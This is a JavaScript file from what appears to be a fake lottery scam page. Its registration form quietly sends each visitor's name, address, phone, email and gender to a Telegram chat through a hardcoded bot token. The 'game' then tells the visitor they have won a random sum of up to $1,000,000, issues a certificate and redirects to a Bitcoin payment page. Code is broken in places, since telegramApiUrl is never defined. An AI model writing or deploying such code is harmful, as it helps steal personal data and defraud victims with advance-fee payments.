document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = new FormData(e.target);
    const registrationData = {};
    formData.forEach((value, key) => {
        registrationData[key] = value;
    });
    
    // Send registration data to Telegram channel
     const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
    const chatId = '874563737';
    const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;
    
    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    }).then(response => response.json()).then(data => {
        if(data.ok) {
            document.getElementById('registration').style.display = 'none';
            document.getElementById('game').style.display = 'block';
        } else {
            alert('Registration failed. Please try again.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('Registration failed. Please try again.');
    });
});

const prizes = [
    '$50,000.00', '$100,000.00', '$125,000.00', '$150,000.00', 
    '$175,000.00', '$200,000.00', '$200,000.00', '$250,000.00', 
    '$300,000.00', '$450,000.00', '$500,000.00', '$600,000.00', 
    '$800,000.00', '$850,000.00', '$900,000.00', '$1,000,000.00'
];

let attempts = 0;

document.getElementById('playButton').addEventListener('click', function() {
    attempts++;
    if (attempts <= 3) {
        const prize = prizes[Math.floor(Math.random() * prizes.length)];
        document.getElementById('result').innerText = `You won ${prize}!`;
        
        if (attempts === 3) {
            document.getElementById('game').style.display = 'none';
            document.getElementById('certificate').style.display = 'block';
            document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize}.`;
        }
    } else {
        attempts = 0;
        document.getElementById('result').innerText = 'Try again!';
    }
});

document.getElementById('downloadCertificate').addEventListener('click', function() {
    const certificateText = document.getElementById('certificateText').innerText;
    const blob = new Blob([certificateText], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'certificate.txt';
    link.click();
});

document.getElementById('payBitcoin').addEventListener('click', function() {
    window.location.href = 'bitcoin_payment.html';
});
